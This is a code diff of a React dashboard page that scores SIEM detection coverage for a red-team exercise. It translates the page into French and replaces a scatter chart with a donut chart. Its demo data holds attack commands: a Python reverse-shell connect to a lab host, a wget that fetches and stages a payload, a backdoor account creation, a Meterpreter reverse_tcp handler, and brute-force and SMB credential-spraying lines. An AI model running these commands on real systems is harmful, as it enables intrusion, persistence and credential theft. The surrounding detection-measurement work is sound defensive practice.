@@ -1,15 +1,15 @@
 import { useState, type ReactNode } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import {
-  BarChart, Bar, Cell, ScatterChart, Scatter, ZAxis,
+  BarChart, Bar, Cell,
   XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, ReferenceLine,
+  PieChart, Pie,
 } from "recharts";
 import {
   AlertCircle, Clock, Shield, ArrowRight, ChevronDown,
   Activity, Target, CheckCircle2, Eye, Radio,
 } from "lucide-react";
 import { PageHeader } from "../../components/ui/PageHeader";
-import { Card } from "../../components/ui/Card";
 import { useUiStore } from "../../store/useUiStore";
 import { useTheme } from "../../contexts/ThemeContext";
 
@@ -37,7 +37,7 @@ interface DetectedAttack {
 
 const TOOL_COLORS: Record<string, string> = {
   nmap: "#3b82f6", hydra: "#f97316", gobuster: "#a855f7",
-  metasploit: "#ef4444", sqlmap: "#eab308", nikto: "#16a34a",
+  metasploit: "#ef4444", netexec: "#06b6d4",
   sudo: "#db2777", python3: "#0d9488", wget: "#4f46e5", useradd: "#d97706",
 };
 
@@ -55,56 +55,39 @@ const SEV_DARK: Record<Severity, SevColors> = {
   CRITICAL: { bg: "#ef444411", border: "#ef444444", text: "#f87171" },
 };
 
-const SEVERITY_NUM: Record<Severity, number> = { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };
-const SEVERITY_LABEL: Record<number, string>  = { 1: "LOW", 2: "MED", 3: "HIGH", 4: "CRIT" };
 
-// delay colors: darker variants for light bg, brighter for dark bg
+const SEVERITY_FR: Record<Severity, string>   = { LOW: "FAIBLE", MEDIUM: "MOYEN", HIGH: "ÉLEVÉ", CRITICAL: "CRITIQUE" };
+
 const delayColor = (d: number, dark: boolean) => {
   if (dark) return d < 30 ? "#22c55e" : d < 60 ? "#84cc16" : d < 90 ? "#eab308" : d < 120 ? "#f97316" : "#ef4444";
   return       d < 30 ? "#16a34a" : d < 60 ? "#65a30d" : d < 90 ? "#d97706" : d < 120 ? "#ea580c" : "#dc2626";
 };
 const getDelayLabel = (d: number) =>
-  d < 30 ? "EXCELLENT" : d < 60 ? "GOOD" : d < 90 ? "FAIR" : "WARNING";
+  d < 30 ? "EXCELLENT" : d < 60 ? "BON" : d < 90 ? "PASSABLE" : "ATTENTION";
 
 // ─── Demo Data ─────────────────────────────────────────────────────────────────
 
 const DEMO_KPI = { coverage: 58, totalAttacks: 12, detectedAttacks: 7, missedAttacks: 5, mttdAvg: 48, exerciseDuration: "28m" };
 
 const DEMO_MISSED: MissedAttack[] = [
-  { id: "ATK-03", time: "14:08:15", tool: "sudo",       technique: "T1548", techniqueName: "Privilege Escalation",             attempts: 5, missReason: "NO_RULE",  command: "sudo -l && sudo su root", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
-  { id: "ATK-06", time: "14:12:33", tool: "metasploit", technique: "T1190", techniqueName: "Exploit Public Application",       attempts: 2, missReason: "NO_RULE",  command: "use exploit/unix/webapp/php_include; set RHOST 10.0.0.5; run", targetIp: "10.0.0.5", sourceIp: "192.168.1.100" },
-  { id: "ATK-08", time: "14:16:45", tool: "useradd",    technique: "T1136", techniqueName: "Create Account — Backdoor",        attempts: 1, missReason: "TIMEOUT", timeoutDelay: "+7m 12s", command: "useradd -m -s /bin/bash backdoor && echo 'backdoor:p4ss' | chpasswd", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
-  { id: "ATK-11", time: "14:22:10", tool: "python3",    technique: "T1059", techniqueName: "Command & Script Interpreter",     attempts: 3, missReason: "NO_RULE",  command: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444))'", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
-  { id: "ATK-14", time: "14:27:55", tool: "wget",       technique: "T1105", techniqueName: "Ingress Tool Transfer",            attempts: 2, missReason: "TIMEOUT", timeoutDelay: "+4m 38s", command: "wget http://192.168.1.100:8080/payload.sh -O /tmp/.payload && chmod +x /tmp/.payload", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
+  { id: "ATK-03", time: "14:08:15", tool: "sudo",       technique: "T1548", techniqueName: "Élévation de privilèges",           attempts: 5, missReason: "NO_RULE",  command: "sudo -l && sudo su root", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
+  { id: "ATK-06", time: "14:12:33", tool: "metasploit", technique: "T1190", techniqueName: "Exploitation d'application exposée", attempts: 2, missReason: "NO_RULE",  command: "use exploit/unix/webapp/php_include; set RHOST 10.0.0.5; run", targetIp: "10.0.0.5", sourceIp: "192.168.1.100" },
+  { id: "ATK-08", time: "14:16:45", tool: "useradd",    technique: "T1136", techniqueName: "Création de compte — Backdoor",     attempts: 1, missReason: "TIMEOUT", timeoutDelay: "+7m 12s", command: "useradd -m -s /bin/bash backdoor && echo 'backdoor:p4ss' | chpasswd", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
+  { id: "ATK-11", time: "14:22:10", tool: "python3",    technique: "T1059", techniqueName: "Interpréteur de commandes",          attempts: 3, missReason: "NO_RULE",  command: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444))'", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
+  { id: "ATK-14", time: "14:27:55", tool: "wget",       technique: "T1105", techniqueName: "Transfert d'outil malveillant",      attempts: 2, missReason: "TIMEOUT", timeoutDelay: "+4m 38s", command: "wget http://192.168.1.100:8080/payload.sh -O /tmp/.payload && chmod +x /tmp/.payload", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
 ];
 
 const DEMO_DETECTED: DetectedAttack[] = [
-  { id: "ATK-01", time: "14:00:00", tool: "nmap",     technique: "T1046", techniqueName: "Network Service Scanning",       delaySeconds: 45,  command: "nmap -sS -sV -O 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-01", ruleId: "40101", ruleName: "Network Scanner Detected",           severity: "MEDIUM",   time: "14:00:45", agent: "wazuh-agent-01", description: "Port scanning from 192.168.1.100 targeting subnet 10.0.0.0/24. TCP SYN flood signature. 1,247 packets over 38s." } },
-  { id: "ATK-02", time: "14:01:55", tool: "hydra",    technique: "T1110", techniqueName: "Brute Force — SSH",             delaySeconds: 15,  command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-02", ruleId: "5710",  ruleName: "Multiple Failed SSH Logins",        severity: "HIGH",     time: "14:02:10", agent: "wazuh-agent-02", description: "847 SSH failures from 192.168.1.100 in 60s. Brute-force confirmed. Targets: root, admin, ubuntu." } },
-  { id: "ATK-04", time: "14:09:30", tool: "gobuster", technique: "T1083", techniqueName: "File & Directory Discovery",    delaySeconds: 88,  command: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-04", ruleId: "31101", ruleName: "Web Scanner — Directory Enumeration", severity: "MEDIUM",   time: "14:10:58", agent: "wazuh-agent-03", description: "3,400+ path requests on Apache access.log from 192.168.1.100. Directory bruteforcing confirmed." } },
-  { id: "ATK-05", time: "14:11:00", tool: "nikto",    technique: "T1595", techniqueName: "Active Scanning — Nikto",      delaySeconds: 32,  command: "nikto -h http://10.0.0.5 -C all -Tuning 123bde", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-05", ruleId: "31106", ruleName: "Vulnerability Scanner Signature",   severity: "HIGH",     time: "14:11:32", agent: "wazuh-agent-03", description: "Nikto User-Agent fingerprint in HTTP headers. CVE probing against 10.0.0.5 web services." } },
-  { id: "ATK-07", time: "14:14:20", tool: "nmap",     technique: "T1046", techniqueName: "Network Service Scanning — UDP", delaySeconds: 28, command: "nmap -sU --top-ports 200 --open 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-07", ruleId: "40102", ruleName: "UDP Port Scan Detected",            severity: "MEDIUM",   time: "14:14:48", agent: "wazuh-agent-01", description: "UDP scanning from 192.168.1.100, top 200 ports. Snort rule 1:10001 triggered." } },
-  { id: "ATK-09", time: "14:18:00", tool: "sqlmap",   technique: "T1190", techniqueName: "SQL Injection Attempt",         delaySeconds: 105, command: "sqlmap -u 'http://10.0.0.5/login.php?id=1' --dbs --level=5 --risk=3", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-09", ruleId: "31151", ruleName: "SQL Injection — Blind Boolean",     severity: "CRITICAL", time: "14:19:45", agent: "wazuh-agent-03", description: "SQLMap blind boolean payloads in /login.php params. MySQL 5.7 fingerprinted. Database dump in progress." } },
-  { id: "ATK-10", time: "14:20:45", tool: "hydra",    technique: "T1110", techniqueName: "Brute Force — FTP",             delaySeconds: 22,  command: "hydra -L users.txt -P passwords.txt -t 16 ftp://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-10", ruleId: "5701",  ruleName: "Multiple Failed FTP Logins",        severity: "HIGH",     time: "14:21:07", agent: "wazuh-agent-02", description: "FTP brute-force: 312 failures in 18s. vsftpd log threshold exceeded. Credential stuffing confirmed." } },
+  { id: "ATK-01", time: "14:00:00", tool: "nmap",     technique: "T1046", techniqueName: "Balayage des services réseau",     delaySeconds: 45,  command: "nmap -sS -sV -O 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-01", ruleId: "40101", ruleName: "Scanner réseau détecté",                severity: "MEDIUM",   time: "14:00:45", agent: "wazuh-agent-01", description: "Balayage de ports depuis 192.168.1.100 vers le sous-réseau 10.0.0.0/24. Signature TCP SYN flood détectée. 1 247 paquets en 38s." } },
+  { id: "ATK-02", time: "14:01:55", tool: "hydra",    technique: "T1110", techniqueName: "Force brute — SSH",                delaySeconds: 15,  command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-02", ruleId: "5710",  ruleName: "Échecs multiples de connexion SSH",    severity: "HIGH",     time: "14:02:10", agent: "wazuh-agent-02", description: "847 échecs SSH depuis 192.168.1.100 en 60s. Force brute confirmée. Comptes ciblés : root, admin, ubuntu." } },
+  { id: "ATK-04", time: "14:09:30", tool: "gobuster", technique: "T1083", techniqueName: "Découverte de fichiers et répertoires", delaySeconds: 88, command: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-04", ruleId: "31101", ruleName: "Scanner web — Énumération de répertoires", severity: "MEDIUM", time: "14:10:58", agent: "wazuh-agent-03", description: "Plus de 3 400 requêtes sur Apache access.log depuis 192.168.1.100. Bruteforce de répertoires confirmé." } },
+  { id: "ATK-05", time: "14:11:00", tool: "metasploit", technique: "T1210", techniqueName: "Exploitation de services distants", delaySeconds: 32,  command: "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-05", ruleId: "31106", ruleName: "Exploitation de service détectée — Metasploit", severity: "HIGH", time: "14:11:32", agent: "wazuh-agent-03", description: "Session Meterpreter établie depuis 192.168.1.100 vers 10.0.0.5. Payload reverse_tcp identifié par Wazuh HIDS." } },
+  { id: "ATK-07", time: "14:14:20", tool: "nmap",     technique: "T1046", techniqueName: "Balayage des services réseau — UDP", delaySeconds: 28, command: "nmap -sU --top-ports 200 --open 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-07", ruleId: "40102", ruleName: "Balayage de ports UDP détecté",          severity: "MEDIUM",   time: "14:14:48", agent: "wazuh-agent-01", description: "Balayage UDP depuis 192.168.1.100, 200 ports principaux. Règle Snort 1:10001 déclenchée." } },
+  { id: "ATK-09", time: "14:18:00", tool: "netexec",  technique: "T1021", techniqueName: "Accès aux services distants — SMB", delaySeconds: 105, command: "netexec smb 10.0.0.0/24 -u admin -p Password123 --shares", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-09", ruleId: "31151", ruleName: "Mouvement latéral SMB détecté — NetExec", severity: "CRITICAL", time: "14:19:45", agent: "wazuh-agent-02", description: "Tentatives d'authentification SMB massives depuis 192.168.1.100. Partages réseau énumérés sur 10.0.0.0/24. Credential stuffing SMB confirmé." } },
+  { id: "ATK-10", time: "14:20:45", tool: "hydra",    technique: "T1110", techniqueName: "Force brute — FTP",                delaySeconds: 22,  command: "hydra -L users.txt -P passwords.txt -t 16 ftp://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-10", ruleId: "5701",  ruleName: "Échecs multiples de connexion FTP",    severity: "HIGH",     time: "14:21:07", agent: "wazuh-agent-02", description: "Force brute FTP : 312 échecs en 18s. Seuil vsftpd dépassé. Credential stuffing confirmé." } },
 ];
 
-const DEMO_MTTD_BARS = DEMO_DETECTED.map((d) => ({ id: d.id.replace("ATK-", ""), delay: d.delaySeconds, tool: d.tool }));
-const DEMO_TOOL_FLAT = [
-  { name: "sudo",        attacks: 5, rate: 0   },
-  { name: "python3",    attacks: 3, rate: 0   },
-  { name: "metasploit", attacks: 2, rate: 0   },
-  { name: "wget",       attacks: 2, rate: 0   },
-  { name: "useradd",    attacks: 1, rate: 0   },
-  { name: "nmap",       attacks: 2, rate: 100 },
-  { name: "hydra",      attacks: 2, rate: 100 },
-  { name: "nikto",      attacks: 1, rate: 100 },
-  { name: "gobuster",   attacks: 1, rate: 100 },
-  { name: "sqlmap",     attacks: 1, rate: 100 },
-];
-const DEMO_SCATTER = DEMO_DETECTED.map((d) => ({
-  delay: d.delaySeconds, severity: SEVERITY_NUM[d.alert.severity],
-  tool: d.tool, id: d.id, name: d.techniqueName, sev: d.alert.severity,
-}));
+const DEMO_MTTD_BARS = DEMO_DETECTED.map((d) => ({ id: d.id.replace("ATK-", ""), delay: d.delaySeconds, tool: d.tool, name: d.techniqueName }));
 
 // ─── Speedometer Gauge ─────────────────────────────────────────────────────────
 
@@ -199,11 +182,11 @@ const ToolBadge = ({ tool }: { tool: string }) => (
 const MissReasonBadge = ({ reason, delay }: { reason: MissReason; delay?: string }) =>
   reason === "NO_RULE" ? (
     <span className="inline-flex items-center gap-1.5 rounded-full border border-red-200 bg-red-50 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-red-600 dark:border-red-500/40 dark:bg-red-500/10 dark:text-red-400">
-      <AlertCircle size={9} />NO RULE
+      <AlertCircle size={9} />SANS RÈGLE
     </span>
   ) : (
     <span className="inline-flex items-center gap-1.5 rounded-full border border-orange-200 bg-orange-50 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-orange-600 dark:border-orange-500/40 dark:bg-orange-500/10 dark:text-orange-400">
-      <Clock size={9} />TIMEOUT {delay}
+      <Clock size={9} />DÉLAI DÉPASSÉ {delay}
     </span>
   );
 
@@ -213,7 +196,7 @@ const SeverityBadge = ({ severity }: { severity: Severity }) => {
   return (
     <span className="rounded px-2 py-0.5 font-mono text-[10px] font-bold uppercase tracking-wider"
       style={{ backgroundColor: c.bg, color: c.text, border: `1px solid ${c.border}` }}>
-      {severity}
+      {SEVERITY_FR[severity]}
     </span>
   );
 };
@@ -243,47 +226,6 @@ const InfoRow = ({ label, value, mono = false }: { label: string; value: ReactNo
   </div>
 );
 
-// ─── Custom Scatter Dot ────────────────────────────────────────────────────────
-
-const ScatterDot = (props: any) => {
-  const { cx, cy, payload } = props;
-  if (!cx || !cy) return null;
-  const color = TOOL_COLORS[payload.tool] ?? "#888";
-  return (
-    <g>
-      <circle cx={cx} cy={cy} r={16} fill={color} fillOpacity={0.15} stroke={color} strokeWidth={1.5} />
-      <circle cx={cx} cy={cy} r={5} fill={color} />
-      <text x={cx} y={cy - 22} textAnchor="middle" fill={color} fontSize={9} fontFamily="JetBrains Mono" fontWeight="bold">
-        {payload.id.replace("ATK-", "#")}
-      </text>
-    </g>
-  );
-};
-
-const ScatterTooltip = ({ active, payload }: any) => {
-  const { theme } = useTheme();
-  const dark = theme === "dark";
-  if (!active || !payload?.length) return null;
-  const d = payload[0]?.payload;
-  if (!d) return null;
-  const color = TOOL_COLORS[d.tool] ?? "#888";
-  return (
-    <div className="rounded-xl border border-slate-200 bg-white p-3 shadow-lg dark:border-white/10 dark:bg-black/90 dark:backdrop-blur-sm">
-      <p className="font-mono text-[10px] uppercase tracking-widest" style={{ color }}>{d.tool}</p>
-      <p className="mt-1 font-mono text-xs text-slate-700 dark:text-coffee-bean-100">{d.name}</p>
-      <div className="mt-2 flex gap-4">
-        <div>
-          <p className="font-mono text-[9px] text-slate-400 dark:text-coffee-bean-200/40">Délai</p>
-          <p className="font-mono text-sm font-bold" style={{ color: delayColor(d.delay, dark) }}>{d.delay}s</p>
-        </div>
-        <div>
-          <p className="font-mono text-[9px] text-slate-400 dark:text-coffee-bean-200/40">Sévérité</p>
-          <SeverityBadge severity={d.sev} />
-        </div>
-      </div>
-    </div>
-  );
-};
 
 // ─── Missed Row ────────────────────────────────────────────────────────────────
 
@@ -368,14 +310,14 @@ const DrillDownRow = ({ atk, index }: { atk: DetectedAttack; index: number }) =>
                       </div>
                     </div>
                     <div className="space-y-2.5">
-                      <InfoRow label="Timestamp" value={atk.time} mono />
+                      <InfoRow label="Horodatage" value={atk.time} mono />
                       <InfoRow label="Outil" value={<ToolBadge tool={atk.tool} />} />
                       <InfoRow label="Technique" value={`${atk.technique} — ${atk.techniqueName}`} />
-                      <InfoRow label="Source IP" value={atk.sourceIp} mono />
-                      <InfoRow label="Target IP" value={atk.targetIp} mono />
+                      <InfoRow label="IP Source" value={atk.sourceIp} mono />
+                      <InfoRow label="IP Cible" value={atk.targetIp} mono />
                     </div>
                     <div className="rounded-xl border border-red-100 bg-red-50 p-3.5 dark:border-red-500/10 dark:bg-red-500/[0.04]">
-                      <p className="mb-2 font-mono text-[9px] uppercase tracking-widest text-red-500 dark:text-red-400/60">Command</p>
+                      <p className="mb-2 font-mono text-[9px] uppercase tracking-widest text-red-500 dark:text-red-400/60">Commande</p>
                       <code className="break-all font-mono text-[10px] leading-relaxed text-slate-700 dark:text-coffee-bean-100">{atk.command}</code>
                     </div>
                   </div>
@@ -407,8 +349,8 @@ const DrillDownRow = ({ atk, index }: { atk: DetectedAttack; index: number }) =>
                       </div>
                     </div>
                     <div className="space-y-2.5">
-                      <InfoRow label="Timestamp" value={atk.alert.time} mono />
-                      <InfoRow label="Rule ID" value={`#${atk.alert.ruleId}`} mono />
+                      <InfoRow label="Horodatage" value={atk.alert.time} mono />
+                      <InfoRow label="ID Règle" value={`#${atk.alert.ruleId}`} mono />
                       <InfoRow label="Règle" value={atk.alert.ruleName} />
                       <InfoRow label="Agent" value={atk.alert.agent} mono />
                       <InfoRow label="Sévérité" value={<SeverityBadge severity={atk.alert.severity} />} />
@@ -472,9 +414,6 @@ export default function Coverage() {
   const grid  = dark ? "#ffffff08" : "#e2e8f0";
   const axis  = dark ? "#ffffff15" : "#e2e8f0";
   const tick  = dark ? "#666"      : "#94a3b8";
-  const lbl   = dark ? "#555"      : "#94a3b8";
-  const tipOk  = dark ? "#22c55e"  : "#16a34a";
-  const tipBad = dark ? "#ef4444"  : "#dc2626";
 
   const mttdTooltip = ({ active, payload }: any) => {
     if (!active || !payload?.length) return null;
@@ -495,10 +434,7 @@ export default function Coverage() {
     return (
       <div className="rounded-xl border border-slate-200 bg-white p-3 shadow-lg dark:border-white/10 dark:bg-black/90 dark:backdrop-blur-sm">
         <p className="font-mono text-[10px] font-bold uppercase tracking-wider" style={{ color }}>{d?.name}</p>
-        <p className="mt-1 font-mono text-xs text-slate-600 dark:text-coffee-bean-100">{d?.attacks} attaque{d?.attacks > 1 ? "s" : ""}</p>
-        <p className="font-mono text-xs" style={{ color: d?.rate === 100 ? tipOk : tipBad }}>
-          {d?.rate === 100 ? "✓ 100% détecté" : d?.rate === 0 ? "✗ Non détecté" : `${d?.rate}% détecté`}
-        </p>
+        <p className="mt-1 font-mono text-xs text-slate-600 dark:text-coffee-bean-100">{d?.attacks} attaque{d?.attacks > 1 ? "s" : ""} détectée{d?.attacks > 1 ? "s" : ""}</p>
       </div>
     );
   };
@@ -521,7 +457,7 @@ export default function Coverage() {
               <motion.span animate={!demoMode ? { scale: [1, 1.5, 1], opacity: [1, 0.4, 1] } : { scale: 1 }}
                 transition={{ duration: 1.8, repeat: Infinity }}
                 className={`size-1.5 rounded-full ${demoMode ? "bg-orange-500 dark:bg-night-bordeaux-500" : "bg-green-500"}`} />
-              {demoMode ? "Demo Exercise" : "Live"}
+              {demoMode ? "Exercice Démo" : "En direct"}
             </span>
             <span className="font-mono text-[10px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/60">{kpi.detectedAttacks}/{kpi.totalAttacks} détectées</span>
           </div>
@@ -615,7 +551,7 @@ export default function Coverage() {
           className="col-span-2 row-span-2 overflow-hidden rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.07] dark:bg-black/40 dark:shadow-none">
           <div className="flex h-full flex-col">
             <div className="flex items-center justify-between">
-              <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-slate-400 dark:text-coffee-bean-200/40">Score Global</p>
+              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-slate-800 dark:text-coffee-bean-50">Score Global</p>
               <div className="flex gap-3">
                 {[{ color: "#22c55e", label: "0–33%" }, { color: "#eab308", label: "33–67%" }, { color: "#ef4444", label: "67–100%" }].map((z) => (
                   <span key={z.label} className="flex items-center gap-1 font-mono text-[9px] text-slate-400 dark:text-coffee-bean-200/40">
@@ -640,7 +576,7 @@ export default function Coverage() {
           className="overflow-hidden rounded-2xl border border-red-100 bg-red-50 p-5 shadow-sm dark:border-red-500/15 dark:bg-red-950/25 dark:shadow-none">
           <div className="flex h-full flex-col justify-between">
             <div className="flex items-start justify-between">
-              <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-red-500 dark:text-red-400/60">Blind Spots</p>
+              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-red-600 dark:text-red-300">Angles Morts</p>
               <AlertCircle size={16} className="text-red-400 dark:text-red-500/60" />
             </div>
             <div>
@@ -655,7 +591,7 @@ export default function Coverage() {
           className="overflow-hidden rounded-2xl border border-blue-100 bg-blue-50 p-5 shadow-sm dark:border-blue-500/15 dark:bg-blue-950/20 dark:shadow-none">
           <div className="flex h-full flex-col justify-between">
             <div className="flex items-start justify-between">
-              <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-blue-500 dark:text-blue-400/60">MTTD Moyen</p>
+              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-blue-600 dark:text-blue-300">MTTD Moyen</p>
               <Clock size={16} className="text-blue-400 dark:text-blue-500/60" />
             </div>
             <div>
@@ -670,7 +606,7 @@ export default function Coverage() {
           className="overflow-hidden rounded-2xl border border-orange-100 bg-orange-50 p-5 shadow-sm dark:border-orange-500/15 dark:bg-orange-950/20 dark:shadow-none">
           <div className="flex h-full flex-col justify-between">
             <div className="flex items-start justify-between">
-              <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-orange-500 dark:text-orange-400/60">Total Attacks</p>
+              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-orange-600 dark:text-orange-300">Total Attacks</p>
               <Target size={16} className="text-orange-400 dark:text-orange-500/60" />
             </div>
             <div>
@@ -685,7 +621,7 @@ export default function Coverage() {
           className="overflow-hidden rounded-2xl border border-purple-100 bg-purple-50 p-5 shadow-sm dark:border-purple-500/15 dark:bg-purple-950/20 dark:shadow-none">
           <div className="flex h-full flex-col justify-between">
             <div className="flex items-start justify-between">
-              <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-purple-500 dark:text-purple-400/60">Durée</p>
+              <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-purple-600 dark:text-purple-300">Durée</p>
               <Activity size={16} className="text-purple-400 dark:text-purple-500/60" />
             </div>
             <div>
@@ -701,12 +637,32 @@ export default function Coverage() {
       <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
 
         {/* MTTD bar chart */}
-        <Card title="MTTD par Événement de Détection">
-          <div className="h-56">
+        <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
+          <p className="mb-4 font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Délai de Détection par Événement</p>
+          <div className="h-96">
             <ResponsiveContainer width="100%" height="100%">
-              <BarChart data={DEMO_MTTD_BARS} barCategoryGap="18%">
+              <BarChart data={DEMO_MTTD_BARS} barCategoryGap="18%" margin={{ top: 5, right: 10, left: 0, bottom: 90 }}>
                 <CartesianGrid strokeDasharray="3 3" stroke={grid} vertical={false} />
-                <XAxis dataKey="id" stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }} />
+                <XAxis
+                  dataKey="name"
+                  stroke={axis}
+                  interval={0}
+                  height={90}
+                  tick={(props: { x: number; y: number; payload: { value: string } }) => (
+                    <g transform={`translate(${props.x},${props.y})`}>
+                      <text
+                        x={0} y={0} dy={4}
+                        textAnchor="end"
+                        transform="rotate(-40)"
+                        fill={tick}
+                        fontSize={9}
+                        fontFamily="JetBrains Mono"
+                      >
+                        {props.payload.value}
+                      </text>
+                    </g>
+                  )}
+                />
                 <YAxis stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }} domain={[0, 130]} />
                 <Tooltip content={mttdTooltip} />
                 <ReferenceLine y={120} stroke="#ef4444" strokeDasharray="4 4"
@@ -721,65 +677,80 @@ export default function Coverage() {
             <p className="mb-1 w-full font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">Légende — Qualité de détection</p>
             {[
               { l: "#16a34a", d: "#22c55e", label: "0–30s · Excellent" },
-              { l: "#65a30d", d: "#84cc16", label: "30–60s · Good" },
-              { l: "#d97706", d: "#eab308", label: "60–90s · Fair" },
-              { l: "#ea580c", d: "#f97316", label: "90–120s · Warning" },
+              { l: "#65a30d", d: "#84cc16", label: "30–60s · Bon" },
+              { l: "#d97706", d: "#eab308", label: "60–90s · Passable" },
+              { l: "#ea580c", d: "#f97316", label: "90–120s · Attention" },
             ].map((c) => (
               <span key={c.label} className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
                 <span className="size-2.5 rounded-sm" style={{ backgroundColor: dark ? c.d : c.l }} />{c.label}
               </span>
             ))}
           </div>
-        </Card>
+        </div>
 
-        {/* Tool breakdown bubble chart */}
-        <Card title="Détection par Outil Red Team">
-          <div className="h-56">
-            <ResponsiveContainer width="100%" height="100%">
-              <ScatterChart margin={{ top: 10, right: 20, left: 0, bottom: 10 }}>
-                <CartesianGrid strokeDasharray="3 3" stroke={grid} />
-                <XAxis dataKey="rate" name="Détection %" type="number" domain={[-5, 110]}
-                  stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }}
-                  label={{ value: "Taux de détection (%)", position: "insideBottom", fill: lbl, fontSize: 10, fontFamily: "JetBrains Mono", dy: 10 }} />
-                <YAxis dataKey="attacks" name="Attaques" type="number" domain={[0, 7]}
-                  stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }}
-                  label={{ value: "Nb attaques", angle: -90, position: "insideLeft", fill: lbl, fontSize: 10, fontFamily: "JetBrains Mono", dx: 10 }} />
-                <ZAxis range={[200, 200]} />
-                <Tooltip content={toolTooltip} />
-                <ReferenceLine x={50} stroke={axis} strokeDasharray="3 3" />
-                <Scatter data={DEMO_TOOL_FLAT} shape={(props: any) => {
-                  const { cx, cy, payload } = props;
-                  if (!cx || !cy) return <g />;
-                  const color = TOOL_COLORS[payload.name] ?? "#888";
-                  const detected = payload.rate === 100;
-                  const r = 8 + payload.attacks * 3;
-                  return (
-                    <g>
-                      <circle cx={cx} cy={cy} r={r + 6} fill={detected ? tipOk : tipBad} fillOpacity={0.08} />
-                      <circle cx={cx} cy={cy} r={r} fill={color} fillOpacity={0.4} stroke={detected ? tipOk : tipBad} strokeWidth={1.5} />
-                      <text x={cx} y={cy + 1} textAnchor="middle" dominantBaseline="middle" fill="white"
-                        fontSize={Math.min(10, r)} fontFamily="JetBrains Mono" fontWeight="bold">
-                        {payload.name.substring(0, 4)}
-                      </text>
-                    </g>
-                  );
-                }} />
-              </ScatterChart>
-            </ResponsiveContainer>
+        {/* Tool breakdown donut chart */}
+        <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
+          <p className="mb-4 font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Détection par Outil Red Team</p>
+          {(() => {
+            const detectedByTool = Object.values(
+              detected.reduce<Record<string, { name: string; attacks: number }>>((acc, d) => {
+                const cur = acc[d.tool] ?? { name: d.tool, attacks: 0 };
+                cur.attacks += 1;
+                acc[d.tool] = cur;
+                return acc;
+              }, {})
+            ).sort((a, b) => b.attacks - a.attacks);
+            const totalDetected = detectedByTool.reduce((s, d) => s + d.attacks, 0);
+            return (
+          <div className="grid grid-cols-[1.4fr_1fr] items-center gap-2">
+            <div className="relative h-60">
+              <ResponsiveContainer width="100%" height="100%">
+                <PieChart>
+                  <Tooltip content={toolTooltip} />
+                  <Pie
+                    data={detectedByTool}
+                    dataKey="attacks"
+                    nameKey="name"
+                    cx="50%" cy="50%"
